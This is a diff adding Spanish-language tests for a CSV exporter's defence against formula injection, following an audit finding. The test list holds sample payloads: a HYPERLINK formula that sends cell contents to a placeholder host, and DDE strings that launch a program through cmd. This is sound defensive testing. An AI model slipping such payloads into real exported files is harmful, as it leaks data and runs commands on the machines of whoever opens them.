@@ -28,6 +28,39 @@ test('CSV: escapa separadores y comillas', () => {
 	assert.equal(csv, '"a;b";"con ""comillas""";normal');
 });
 
+/*
+ * Auditoría TS-P2-15. Un CSV es texto plano y la hoja de cálculo se lo cree entero: si una celda
+ * empieza por `=`, `+`, `-` o `@`, Excel y LibreOffice no enseñan ese texto, EJECUTAN lo que
+ * ponga. Aquí no es teórico —la lista de materiales lleva la descripción de cada aparato, que
+ * puede venir de un proyecto que mandó otro, y el parte de obra lleva la nota que uno escribe en
+ * la cubierta y manda por correo al terminar la jornada—.
+ */
+test('CSV: una celda que empieza por = no se ejecuta al abrir la hoja', () => {
+	const trampas = [
+		'=HYPERLINK("http://x?"&A1,"pincha")',
+		'=cmd|\'/c calc\'!A1',
+		'+1+1',
+		'@SUM(A1:A9)',
+		'-2+3+cmd|\' /c calc\'!A0',
+	];
+	for (const t of trampas) {
+		const celda = aCSV([[t]]).replace(/^"|"$/g, '');
+		assert.ok(celda.startsWith("'"), `«${t}» sigue arrancando fórmula: «${celda}»`);
+		// El apóstrofo no se ve en la hoja: el texto se sigue leyendo igual que se escribió.
+		assert.equal(celda.slice(1).replaceAll('""', '"'), t);
+	}
+});
+
+test('CSV: un número con signo sigue siendo un número, no texto', () => {
+	// Neutralizar de más rompería las columnas de cotas y longitudes, que salen negativas.
+	assert.equal(aCSV([[-5, 3.5, '-12', '+3,5', '-1.2e3']]), '-5;3.5;-12;+3,5;-1.2e3');
+});
+
+test('CSV: el texto normal no se toca', () => {
+	assert.equal(aCSV([['UMA-3-343', 'Disyuntor 1P C10', 'iC60N', 10]]),
+		'UMA-3-343;Disyuntor 1P C10;iC60N;10');
+});
+
 test('el proyecto de ejemplo pasa el DRC sin errores', () => {
 	const p = tableroEjemplo();
 	numerarDispositivos(p);
